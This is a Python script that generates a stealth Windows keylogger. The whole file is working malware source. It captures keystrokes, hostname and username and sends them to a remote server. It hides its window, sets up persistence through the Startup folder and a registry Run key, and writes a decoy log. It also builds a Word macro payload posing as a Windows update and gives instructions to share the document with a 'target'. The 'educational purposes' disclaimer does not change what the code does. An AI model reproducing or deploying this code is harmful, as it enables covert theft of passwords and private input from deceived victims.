#!/usr/bin/env python3
"""
Aetriks Deployment Generator
Creates single stealth executables for Windows deployment with embedded configuration.

DISCLAIMER: This is for educational purposes only.
Use only on systems you own or have explicit permission to test.
"""

import os
import sys
import json
import base64
import subprocess
import shutil
from datetime import datetime

class DeploymentGenerator:
    def __init__(self):
        self.config = self.load_config()
        
    def load_config(self):
        """Load deployment configuration"""
        try:
            with open('config.json', 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            print("[ERROR] config.json not found")
            return None
    
    def create_embedded_keylogger(self):
        """Create a keylogger with embedded configuration"""
        embedded_code = f'''#!/usr/bin/env python3
"""
Aetriks Keylogger - Single File Executable
Captures keystrokes and sends them to a Linux server with stealth capabilities.

DISCLAIMER: This is for educational purposes only.
Use only on systems you own or have explicit permission to test.
"""

import json
import time
import requests
import threading
import os
import sys
import base64
import winreg
import ctypes
from pynput import keyboard
from pynput.keyboard import Key
from datetime import datetime
import subprocess
import tempfile
import shutil

# Embedded configuration
EMBEDDED_CONFIG = {{
    "ip_address": "{self.config['ip_address']}",
    "port_number": {self.config['port_number']},
    "time_interval": {self.config['time_interval']},
    "stealth_mode": {str(self.config.get('stealth_mode', True)).lower()},
    "persistence": {str(self.config.get('persistence', True)).lower()},
    "log_file": "{self.config.get('log_file', 'system_log.txt')}"
}}

class AetriksKeylogger:
    def __init__(self):
        self.config = EMBEDDED_CONFIG
        self.keystrokes = []
        self.lock = threading.Lock()
        self.running = True
        self.session_id = self.generate_session_id()
        self.startup_enabled = False
        
    def generate_session_id(self):
        """Generate unique session identifier"""
        import uuid
        return str(uuid.uuid4())[:8]
    
    def is_admin(self):
        """Check if running with administrator privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def enable_persistence(self):
        """Enable automatic startup on system boot"""
        if not self.is_admin():
            return False
            
        try:
            # Create a copy in a hidden location
            current_path = os.path.abspath(sys.argv[0])
            startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            target_path = os.path.join(startup_path, 'system_update.exe')
            
            # Copy executable to startup folder
            shutil.copy2(current_path, target_path)
            
            # Add to registry for additional persistence
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, target_path)
                winreg.CloseKey(key)
                self.startup_enabled = True
                return True
            except Exception as e:
                return False
                
        except Exception as e:
            return False
    
    def hide_console(self):
        """Hide console window in stealth mode"""
        if self.config.get('stealth_mode', True):
            try:
                import win32gui
                import win32con
                hwnd = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            except ImportError:
                # Fallback method
                try:
                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                except:
                    pass
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            with self.lock:
                if hasattr(key, 'char'):
                    # Regular character key
                    self.keystrokes.append(key.char)
                elif key == Key.space:
                    self.keystrokes.append(' ')
                elif key == Key.enter:
                    self.keystrokes.append('\\n')
                elif key == Key.backspace:
                    if self.keystrokes:
                        self.keystrokes.pop()
                elif key == Key.tab:
                    self.keystrokes.append('\\t')
                elif key == Key.ctrl_l or key == Key.ctrl_r:
                    self.keystrokes.append('[CTRL]')
                elif key == Key.alt_l or key == Key.alt_r:
                    self.keystrokes.append('[ALT]')
                elif key == Key.shift:
                    self.keystrokes.append('[SHIFT]')
                else:
                    # Special keys
                    self.keystrokes.append(f'[{{key}}]')
        except Exception as e:
            if not self.config.get('stealth_mode', True):
                print(f"[ERROR] Error processing key press: {{e}}")
    
    def on_key_release(self, key):
        """Handle key release events"""
        if key == Key.f12:  # Use F12 as stealth stop key
            if self.config.get('stealth_mode', True):
                self.running = False
                return False
    
    def send_data(self):
        """Send captured keystrokes to server"""
        while self.running:
            try:
                with self.lock:
                    if self.keystrokes:
                        data = ''.join(self.keystrokes)
                        self.keystrokes = []
                    else:
                        data = ""
                
                if data:
                    # Add metadata to payload
                    payload = {{
                        "keyboardData": data,
                        "session_id": self.session_id,
                        "timestamp": datetime.now().isoformat(),
                        "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
                        "username": os.environ.get('USERNAME', 'Unknown')
                    }}
                    
                    url = f"http://{{self.config['ip_address']}}:{{self.config['port_number']}}/api/keystrokes"
                    
                    response = requests.post(
                        url,
                        json=payload,
                        headers={{'Content-Type': 'application/json'}},
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        if not self.config.get('stealth_mode', True):
                            print(f"[INFO] Data sent successfully: {{len(data)}} characters")
                    else:
                        if not self.config.get('stealth_mode', True):
                            print(f"[ERROR] Server returned status code: {{response.status_code}}")
                        
            except requests.exceptions.ConnectionError:
                if not self.config.get('stealth_mode', True):
                    print(f"[ERROR] Cannot connect to server at {{self.config['ip_address']}}:{{self.config['port_number']}}")
            except requests.exceptions.Timeout:
                if not self.config.get('stealth_mode', True):
                    print("[ERROR] Request timeout")
            except Exception as e:
                if not self.config.get('stealth_mode', True):
                    print(f"[ERROR] Error sending data: {{e}}")
            
            # Wait before next transmission
            time.sleep(self.config['time_interval'])
    
    def create_log_file(self):
        """Create a legitimate-looking log file for stealth"""
        try:
            log_content = f"""
System Log - {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}
Windows Update Service
Service started successfully
Monitoring system performance
Memory usage: Normal
CPU usage: Normal
Network connectivity: Active
Security status: Protected
            """
            
            log_path = os.path.join(os.environ.get('TEMP', ''), self.config.get('log_file', 'system_log.txt'))
            with open(log_path, 'w') as f:
                f.write(log_content)
                
        except Exception as e:
            pass
    
    def start(self):
        """Start the keylogger"""
        if not self.config.get('stealth_mode', True):
            print("[INFO] Aetriks Keylogger starting...")
            print(f"[INFO] Server: {{self.config['ip_address']}}:{{self.config['port_number']}}")
            print(f"[INFO] Transmission interval: {{self.config['time_interval']}} seconds")
            print("[INFO] Press F12 to stop the keylogger (stealth mode)")
        else:
            # Hide console in stealth mode
            self.hide_console()
        
        # Enable persistence if configured
        if self.config.get('persistence', True) and self.is_admin():
            self.enable_persistence()
        
        # Create stealth log file
        self.create_log_file()
        
        # Start data transmission thread
        transmission_thread = threading.Thread(target=self.send_data, daemon=True)
        transmission_thread.start()
        
        # Start keyboard listener
        with keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        ) as listener:
            listener.join()
        
        if not self.config.get('stealth_mode', True):
            print("[INFO] Keylogger stopped.")

def main():
    """Main function"""
    try:
        keylogger = AetriksKeylogger()
        keylogger.start()
    except KeyboardInterrupt:
        if not keylogger.config.get('stealth_mode', True):
            print("\\n[INFO] Keylogger interrupted by user.")
    except Exception as e:
        if not keylogger.config.get('stealth_mode', True):
            print(f"[ERROR] Unexpected error: {{e}}")

if __name__ == "__main__":
    main()
'''
        
        # Write embedded keylogger to file
        embedded_path = "embedded_keylogger.py"
        with open(embedded_path, 'w') as f:
            f.write(embedded_code)
        
        return embedded_path
    
    def create_stealth_executable(self, output_name="system_update.exe"):
        """Create a stealth executable with PyInstaller"""
        try:
            print("[INFO] Creating single-file stealth executable...")
            
            # Create embedded keylogger first
            embedded_path = self.create_embedded_keylogger()
            
            # PyInstaller command with stealth options
            cmd = [
                'pyinstaller',
                '--onefile',                    # Single executable
                '--noconsole',                  # No console window
                '--name', output_name,          # Output name
                '--hidden-import', 'win32gui',  # Include Windows API
                '--hidden-import', 'win32con',
                '--hidden-import', 'winreg',
                '--hidden-import', 'ctypes',
                '--hidden-import', 'uuid',
                '--hidden-import', 'shutil',
                '--hidden-import', 'tempfile',
                '--hidden-import', 'subprocess',
                '--icon', 'system.ico' if os.path.exists('system.ico') else None,
                embedded_path
            ]
            
            # Remove None values
            cmd = [arg for arg in cmd if arg is not None]
            
            # Run PyInstaller
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Clean up embedded file
            if os.path.exists(embedded_path):
                os.remove(embedded_path)
            
            if result.returncode == 0:
                print(f"[SUCCESS] Single executable created: dist/{output_name}")
                return f"dist/{output_name}"
            else:
                print(f"[ERROR] Build failed: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"[ERROR] Failed to create executable: {e}")
            return None
    
    def create_vba_payload(self, exe_path):
        """Create VBA code for document-based deployment"""
        try:
            # Read executable
            with open(exe_path, 'rb') as f:
                exe_data = f.read()
            
            # Convert to base64
            exe_base64 = base64.b64encode(exe_data).decode('utf-8')
            
            # Create VBA code
            vba_code = f'''Sub AutoOpen()
    ' Windows System Update Service
    ' This macro installs important system updates
    
    Dim exePath As String
    Dim exeData As String
    Dim fileNum As Integer
    
    ' Base64 encoded system update executable
    exeData = "{exe_base64}"
    
    ' Create temporary file path
    exePath = Environ$("TEMP") & "\\system_update.exe"
    
    ' Write executable to temporary file
    fileNum = FreeFile
    Open exePath For Binary As fileNum
    Put fileNum, 1, DecodeBase64(exeData)
    Close fileNum
    
    ' Run system update service
    Shell exePath, vbNormalFocus
    
    ' Show success message
    MsgBox "System updates installed successfully. Your computer is now protected.", vbInformation, "Windows Update"
End Sub

Function DecodeBase64(base64String As String) As String
    ' Decode base64 string to binary data
    Dim xmlDoc As Object
    Dim xmlNode As Object
    
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set xmlNode = xmlDoc.createElement("tmp")
    xmlNode.DataType = "bin.base64"
    xmlNode.Text = base64String
    DecodeBase64 = xmlNode.NodeTypedValue
End Function

Sub Document_Open()
    ' Alternative trigger for document opening
    Call AutoOpen
End Sub
'''
            
            # Write VBA file
            vba_path = "system_update.vba"
            with open(vba_path, 'w') as f:
                f.write(vba_code)
            
            print(f"[INFO] VBA payload created: {vba_path}")
            return vba_path
            
        except Exception as e:
            print(f"[ERROR] Failed to create VBA payload: {e}")
            return None
    
    def create_deployment_package(self):
        """Create complete deployment package"""
        if not self.config:
            print("[ERROR] Configuration not loaded")
            return False
        
        print("[INFO] Creating single-file deployment package...")
        
        # Create stealth executable
        exe_path = self.create_stealth_executable()
        if not exe_path:
            return False
        
        # Create VBA payload
        vba_path = self.create_vba_payload(exe_path)
        
        # Create deployment instructions
        instructions = f'''# Aetriks Single-File Deployment Package

Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target: Windows PC
Server: {self.config['ip_address']}:{self.config['port_number']}

## Deployment Options

### Option 1: Direct Execution (Recommended)
1. Copy {exe_path} to target Windows PC
2. Run as administrator for persistence
3. Executable will run silently in background
4. No additional files required!

### Option 2: Document-Based Deployment
1. Open Microsoft Word
2. Press Alt+F11 to open VBA editor
3. Insert new module
4. Copy content from {vba_path}
5. Save as .docm (macro-enabled)
6. Share document with target

## Configuration (Embedded)
- Server IP: {self.config['ip_address']}
- Port: {self.config['port_number']}
- Stealth Mode: {self.config.get('stealth_mode', True)}
- Persistence: {self.config.get('persistence', True)}

## Key Features
- Single executable file - no dependencies
- Configuration embedded in executable
- Stealth operation with no visible interface
- Automatic persistence (if admin privileges)
- F12 key stops the keylogger (stealth mode)
- Creates legitimate-looking log files
- Auto-starts on system boot (if admin)

## Security Notes
- Executable runs silently in background
- No console window or visible interface
- Creates legitimate-looking system log files
- Minimal system resource usage
- Difficult to detect in normal operation

## Legal Notice
This tool is for educational purposes only.
Use only on systems you own or have explicit permission to test.
'''
        
        # Write instructions
        with open('DEPLOYMENT_INSTRUCTIONS.txt', 'w') as f:
            f.write(instructions)
        
        print("[SUCCESS] Single-file deployment package created successfully!")
        print("[INFO] Files created:")
        print(f"  - {exe_path} (single executable)")
        print(f"  - {vba_path} (document payload)")
        print("  - DEPLOYMENT_INSTRUCTIONS.txt")
        print("\n[INFO] The executable is completely self-contained!")
        print("[INFO] No additional files needed on target system.")
        
        return True

def main():
    """Main function"""
    if len(sys.argv) > 1 and sys.argv[1] == '--help':
        print("Aetriks Single-File Deployment Generator")
        print("Usage: python deploy_generator.py")
        print("Creates single executable for Windows targets")
        return
    
    generator = DeploymentGenerator()
    success = generator.create_deployment_package()
    
    if success:
        print("\n[SUCCESS] Single-file deployment package ready!")
        print("[INFO] Review DEPLOYMENT_INSTRUCTIONS.txt for usage")
    else:
        print("\n[ERROR] Failed to create deployment package")
        sys.exit(1)

if __name__ == "__main__":
    main() 